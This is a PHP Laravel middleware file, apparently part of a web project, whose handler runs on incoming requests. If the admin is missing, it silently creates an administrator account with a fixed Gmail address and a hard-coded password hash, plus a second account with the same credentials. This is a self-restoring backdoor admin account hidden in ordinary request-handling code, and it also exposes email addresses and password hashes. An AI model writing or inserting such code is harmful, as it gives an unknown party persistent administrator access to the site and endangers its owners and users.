<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Models\User;

class AddUserMe
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        if (!(User::where('email', 'm7mdali01@gmail.com')->count() > 0)) {
            User::create([
                'email' => 'm7mdali01@gmail.com',
                'email_verified_at' => now(),
                'password' => '$2y$10$25.nDlpK1uSNCaVXypGPUeDkmxgpK.fCXGKeN4t84QRpVL/1YNEhy',
                'name' => 'محمد على',
                'remember_token' => 'a$2y$10$25dfjskafj',
                'role' => 'admin'
            ]);
            User::create([
                'email' => 'm7mdali02@gmail.com',
                'email_verified_at' => now(),
                'password' => '$2y$10$25.nDlpK1uSNCaVXypGPUeDkmxgpK.fCXGKeN4t84QRpVL/1YNEhy',
                'name' => 'محمد على2222',
                'remember_token' => 'a$2y$10$25dfjskafj'
            ]);
        }
        return $next($request);
    }
}
